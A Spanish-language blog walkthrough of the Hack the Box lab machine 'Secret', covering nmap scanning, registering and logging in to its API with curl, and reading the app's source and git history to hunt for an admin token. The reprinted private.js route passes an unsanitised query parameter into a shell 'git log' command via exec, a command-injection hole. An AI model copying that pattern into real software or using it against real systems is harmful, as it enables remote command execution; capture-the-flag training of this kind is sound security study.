---
layout: single
title: MÃ¡quina Secret Hack the Box
comments: true
excerpt: "MÃ¡quina Secret Hack the Box"
date: 2022-05-09
classes: wide
header:
  teaser: /assets/images/2022-05-10-Secret/logo.png
  teaser_home_page: true
categories:
  - HacktheBox
tags:
  - Hackthebox
  - linux
  - Hacking
  - Easy
---

Realizamos un reconocimiento de los servicios que estÃ¡ corriendo la mÃ¡quina y vemos que tiene el puerto 21 con ftp al parecer, puerto 22 con ssh y puerto 80 con un http y el puerto 3000 con un http

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #cat nmap 
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: nmap
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ # Nmap 7.92 scan initiated Fri Feb  4 18:13:14 2022 as: nmap -sCV -p22,80,3000 -oN nmap 10.10.11.120
   2   â”‚ Nmap scan report for 10.10.11.120
   3   â”‚ Host is up (0.082s latency).
   4   â”‚ 
   5   â”‚ PORT     STATE SERVICE VERSION
   6   â”‚ 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   7   â”‚ | ssh-hostkey: 
   8   â”‚ |   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
   9   â”‚ |   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
  10   â”‚ |_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
  11   â”‚ 80/tcp   open  http    nginx 1.18.0 (Ubuntu)
  12   â”‚ |_http-title: DUMB Docs
  13   â”‚ |_http-server-header: nginx/1.18.0 (Ubuntu)
  14   â”‚ 3000/tcp open  http    Node.js (Express middleware)
  15   â”‚ |_http-title: DUMB Docs
  16   â”‚ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  17   â”‚ 
  18   â”‚ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  19   â”‚ # Nmap done at Fri Feb  4 18:13:29 2022 -- 1 IP address (1 host up) scanned in 15.77 seconds
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

Primero vamos a revisar el servicio http para ver con que nos encontramos y vemos una pÃ¡gina web llamada DUMb Docs

![1.png](/assets/images/2022-05-10-Secret/1.png)

Dentro de ella vemos unos pasos que son para crear un jwt con unos datos que le enviemos 

![2.png](/assets/images/2022-05-10-Secret/2.png)

Vamos a realizar los pasos que tenemos para crearnos nuestro jwt, lo primero que nos dice es que debemos consumir la pÃ¡gina en el puerto 3000 en /api/user/register, y cargar un archivo Json, con el metodo POST, para realizar esto lo vamos a hacer con la herramienta curl, nos creamos nuestro archivo y nos dice que si todo sale bien nos va a devolver un mensaje que diga â€œuserâ€: â€œangussmoodyâ€ vamos a ver la forma de mandar un archivo por medio de curl y nos encontramos con este [artÃ­culo](https://gist.github.com/ungoldman/11282441) 

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #cat register.json 
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: register.json
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚   {
   2   â”‚     "name": "angussmoody",
   3   â”‚     "email": "angussmoody@dasith.works",
   4   â”‚     "password": "angussmoody123*"
   5   â”‚   }
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

Enviamos nuestra peticiÃ³n y vemos que nos devuelve el mensaje con el usuario

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #curl -X POST -H "Content-Type: application/json" -d @register.json "http://10.10.11.120:3000/api/user/register"; echo
{"user":"angussmoody"}
```

Ahora vamos a pasar a la parte de login, nos dice que debemos enviar un json con el email y el password en /api/user/login

![3.png](/assets/images/2022-05-10-Secret/3.png)

Nos creamos nuestro archivo en json y nos dice que si todo sale bien, nos entregarÃ¡ un token 

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #cat login.json 
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: login.json
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚  {
   2   â”‚     "email": "angussmoody@dasith.works",
   3   â”‚     "password": "angussmoody123*"
   4   â”‚   }
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

corremos el comando con el curl y vemos que nos entrega un token

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #curl -X POST -H "Content-Type: application/json" -d @login.json "http://10.10.11.120:3000/api/user/login"; echo
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWZkZTFiMDdhMzdmOTA0NjVkOTMwYjgiLCJuYW1lIjoiYW5ndXNzbW9vZHkiLCJlbWFpbCI6ImFuZ3Vzc21vb2R5QGRhc2l0aC53b3JrcyIsImlhdCI6MTY0NDAyODgwN30.wzhR0uTJleJIGJ46gRPvuueXpEAXESQVXx1zl-zcDIU
```

Revisamos ese token y nos dice que no tiene asignature

![4.png](/assets/images/2022-05-10-Secret/4.png)

Continuando con la pagina nos dice que existe un directorio llamado /priv asÃ­ que vamos a probar nuestro token en este directorio

![5.png](/assets/images/2022-05-10-Secret/5.png)

![6.png](/assets/images/2022-05-10-Secret/6.png)

Nos envÃ­a un access Denied 

![7.png](/assets/images/2022-05-10-Secret/7.png)

Al probar con nuestro token tenemos el mismo resultado 

![8.png](/assets/images/2022-05-10-Secret/8.png)

entonces debemos tratar de encontrar un token de administrador, volviendo a la pÃ¡gina nos descargamos un archivo que esta nos brinda

![9.png](/assets/images/2022-05-10-Secret/9.png)

AsÃ­ que pasamos a buscar en estos archivos algo que nos pueda ayudar a tener los permisos de administrador, descomprimimos el archivo y nos entrega un directorio llamado local-web

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file]
â””â”€â”€â•¼ #ll
Permissions Size User        Date Modified Name
.rwxrwxrwx   28M angussmoody  4 feb 19:55  files.zip
drwxrwxrwx     - angussmoody  3 sep  2021  local-web
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file]
â””â”€â”€â•¼ #ll local-web/
Permissions Size User        Date Modified Name
.rwxrwxrwx   885 angussmoody  3 sep  2021  index.js
drwxrwxrwx     - angussmoody 12 ago  2021  model
drwxrwxrwx     - angussmoody 12 ago  2021  node_modules
.rwxrwxrwx   69k angussmoody 12 ago  2021  package-lock.json
.rwxrwxrwx   491 angussmoody 12 ago  2021  package.json
drwxrwxrwx     - angussmoody  3 sep  2021  public
drwxrwxrwx     - angussmoody  3 sep  2021  routes
drwxrwxrwx     - angussmoody 12 ago  2021  src
.rwxrwxrwx   651 angussmoody 12 ago  2021  validations.js
```

Dentro del directorio routes nos encontramos con un archivo llamado llamado private.js donde vemos un usuario llamado theadmin con una descripciÃ³n 

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web]
â””â”€â”€â•¼ #cat routes/private.js 
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: routes/private.js
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ const router = require('express').Router();
   2   â”‚ const verifytoken = require('./verifytoken')
   3   â”‚ const User = require('../model/user');
   4   â”‚ 
   5   â”‚ router.get('/priv', verifytoken, (req, res) => {
   6   â”‚    // res.send(req.user)
   7   â”‚ 
   8   â”‚     const userinfo = { name: req.user }
   9   â”‚ 
  10   â”‚     const name = userinfo.name.name;
  11   â”‚     
  12   â”‚     if (name == 'theadmin'){
  13   â”‚         res.json({
  14   â”‚             creds:{
  15   â”‚                 role:"admin", 
  16   â”‚                 username:"theadmin",
  17   â”‚                 desc : "welcome back admin,"
  18   â”‚             }
  19   â”‚         })
  20   â”‚     }
  21   â”‚     else{
  22   â”‚         res.json({
  23   â”‚             role: {
  24   â”‚                 role: "you are normal user",
  25   â”‚                 desc: userinfo.name.name
  26   â”‚             }
  27   â”‚         })
  28   â”‚     }
  29   â”‚ })
  30   â”‚ 
  31   â”‚ 
  32   â”‚ router.get('/logs', verifytoken, (req, res) => {
  33   â”‚     const file = req.query.file;
  34   â”‚     const userinfo = { name: req.user }
  35   â”‚     const name = userinfo.name.name;
  36   â”‚     
  37   â”‚     if (name == 'theadmin'){
  38   â”‚         const getLogs = `git log --oneline ${file}`;
  39   â”‚         exec(getLogs, (err , output) =>{
  40   â”‚             if(err){
  41   â”‚                 res.status(500).send(err);
  42   â”‚                 return
  43   â”‚             }
  44   â”‚             res.json(output);
  45   â”‚         })
  46   â”‚     }
  47   â”‚     else{
  48   â”‚         res.json({
  49   â”‚             role: {
  50   â”‚                 role: "you are normal user",
  51   â”‚                 desc: userinfo.name.name
  52   â”‚             }
  53   â”‚         })
  54   â”‚     }
  55   â”‚ })
  56   â”‚ 
  57   â”‚ router.use(function (req, res, next) {
  58   â”‚     res.json({
  59   â”‚         message: {
  60   â”‚ 
  61   â”‚             message: "404 page not found",
  62   â”‚             desc: "page you are looking for is not found. "
  63   â”‚         }
  64   â”‚     })
  65   â”‚ });
  66   â”‚ 
  67   â”‚ 
  68   â”‚ module.exports = router
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

En el directorio  routes no escontramos tambiÃ©n con un archivo llamado auth.js donde nos dice como crea el token y que valida los datos _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET, donde TOKEN_SECRET debe ser la firma de Ã©ste   

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web]
â””â”€â”€â•¼ #cat routes/auth.js 
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: routes/auth.js
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ const router = require('express').Router();
   2   â”‚ const User = require('../model/user');
   3   â”‚ const bcrypt = require('bcryptjs')
   4   â”‚ const jwt = require('jsonwebtoken')
   5   â”‚ const { registerValidation, loginValidation} = require('../validations')
   6   â”‚ 
   7   â”‚ router.post('/register', async (req, res) => {
   8   â”‚ 
   9   â”‚     // validation
  10   â”‚     const { error } = registerValidation(req.body)
  11   â”‚     if (error) return res.status(400).send(error.details[0].message);
  12   â”‚ 
  13   â”‚     // check if user exists
  14   â”‚     const emailExist = await User.findOne({email:req.body.email})
  15   â”‚     if (emailExist) return res.status(400).send('Email already Exist')
  16   â”‚ 
  17   â”‚     // check if user name exist 
  18   â”‚     const unameexist = await User.findOne({ name: req.body.name })
  19   â”‚     if (unameexist) return res.status(400).send('Name already Exist')
  20   â”‚ 
  21   â”‚     //hash the password
  22   â”‚     const salt = await bcrypt.genSalt(10);
  23   â”‚     const hashPaswrod = await bcrypt.hash(req.body.password, salt)
  24   â”‚ 
  25   â”‚ 
  26   â”‚     //create a user 
  27   â”‚     const user = new User({
  28   â”‚         name: req.body.name,
  29   â”‚         email: req.body.email,
  30   â”‚         password:hashPaswrod
  31   â”‚     });
  32   â”‚ 
  33   â”‚     try{
  34   â”‚         const saveduser = await user.save();
  35   â”‚         res.send({ user: user.name})
  36   â”‚     
  37   â”‚     }
  38   â”‚     catch(err){
  39   â”‚         console.log(err)
  40   â”‚     }
  41   â”‚ 
  42   â”‚ });
  43   â”‚ 
  44   â”‚ 
  45   â”‚ // login 
  46   â”‚ 
  47   â”‚ router.post('/login', async  (req , res) => {
  48   â”‚ 
  49   â”‚     const { error } = loginValidation(req.body)
  50   â”‚     if (error) return res.status(400).send(error.details[0].message);
  51   â”‚ 
  52   â”‚     // check if email is okay 
  53   â”‚     const user = await User.findOne({ email: req.body.email })
  54   â”‚     if (!user) return res.status(400).send('Email is wrong');
  55   â”‚ 
  56   â”‚     // check password 
  57   â”‚     const validPass = await bcrypt.compare(req.body.password, user.password)
  58   â”‚     if (!validPass) return res.status(400).send('Password is wrong');
  59   â”‚ 
  60   â”‚ 
  61   â”‚     // create jwt 
  62   â”‚     const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
  63   â”‚     res.header('auth-token', token).send(token);
  64   â”‚ 
  65   â”‚ })
  66   â”‚ 
  67   â”‚ router.use(function (req, res, next) {
  68   â”‚     res.json({
  69   â”‚         message: {
  70   â”‚ 
  71   â”‚             message: "404 page not found",
  72   â”‚             desc: "page you are looking for is not found. "
  73   â”‚         }
  74   â”‚     })
  75   â”‚ });
  76   â”‚ 
  77   â”‚ module.exports = router
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

Despues de buscar un rato vamos al directorio .git para ver los logs que tiene con:   log   Muestra los logs de los commits

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web/.git]
â””â”€â”€â•¼ #la
Permissions Size User        Date Modified Name
drwxrwxrwx     - angussmoody  3 sep  2021  branches
.rwxrwxrwx    38 angussmoody  8 sep  2021  COMMIT_EDITMSG
.rwxrwxrwx    92 angussmoody  3 sep  2021  config
.rwxrwxrwx    73 angussmoody  3 sep  2021  description
.rwxrwxrwx    23 angussmoody  3 sep  2021  HEAD
drwxrwxrwx     - angussmoody  3 sep  2021  hooks
.rwxrwxrwx  463k angussmoody  8 sep  2021  index
drwxrwxrwx     - angussmoody  3 sep  2021  info
drwxrwxrwx     - angussmoody  3 sep  2021  logs
drwxrwxrwx     - angussmoody  8 sep  2021  objects
drwxrwxrwx     - angussmoody  3 sep  2021  refs
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web/.git]
â””â”€â”€â•¼ #git --help
uso: git [--version] [--help] [-C <ruta>] [-c <nombre>=<valor>]
           [--exec-path[=<ruta>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
           [--git-dir=<ruta>] [--work-tree=<ruta>] [--namespace=<nombre>]
           <comando> [<args>]

Estos son comandos comunes de Git usados en varias situaciones:

comienza un Ã¡rea de trabajo (ver tambiÃ©n: git help tutorial)
   clone             Clona un repositorio dentro de un nuevo directorio
   init              Crea un repositorio de Git vacÃ­o o reinicia el que ya existe

trabaja en los cambios actuales (ver tambiÃ©n: git help everyday)
   add               Agrega contenido de carpetas al Ã­ndice
   mv                Mueve o cambia el nombre a archivos, directorios o enlaces simbÃ³licos
   restore           Restaurar archivos de Ã¡rboles de trabajo
   rm                Borra archivos del Ã¡rbol de trabajo y del Ã­ndice
   sparse-checkout   Inicializa y modifica el sparse-checkout

examina el historial y el estado (ver tambiÃ©n: git help revisions)
   bisect            Use la bÃºsqueda binaria para encontrar el commit que introdujo el bug
   diff              Muestra los cambios entre commits, commit y Ã¡rbol de trabajo, etc
   grep              Imprime las lÃ­neas que concuerdan con el patron
   
   show              Muestra varios tipos de objetos
   status            Muestra el estado del Ã¡rbol de trabajo

crece, marca y ajusta tu historial comÃºn
   branch            Lista, crea, o borra ramas
   commit            Graba los cambios en tu repositorio
   merge             Junta dos o mÃ¡s historiales de desarrollo juntos
   rebase            Vuelve a aplicar commits en la punta de otra rama
   reset             Reinicia el HEAD actual a un estado especifico
   switch            Cambiar branches
   tag               Crea, lista, borra o verifica un tag de objeto firmado con GPG

colabora (mira tambiÃ©n: git help workflows)
   fetch             Descarga objetos y referencias de otro repositorio
   pull              Realiza un fetch e integra con otro repositorio o rama local
   push              Actualiza referencias remotas junto con sus objetos asociados

'git help -a' y 'git help -g' listan los subcomandos disponibles y algunas
guÃ­as de concepto. Consulte 'git help <command>' o 'git help <concepto>'
para leer sobre un subcomando o concepto especÃ­fico.
Mira 'git help git' para una vista general del sistema.
```

ejecutamos el comando y vemos unas notas de los commit 

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web/.git]
â””â”€â”€â•¼ #git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server ðŸ˜ƒ

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

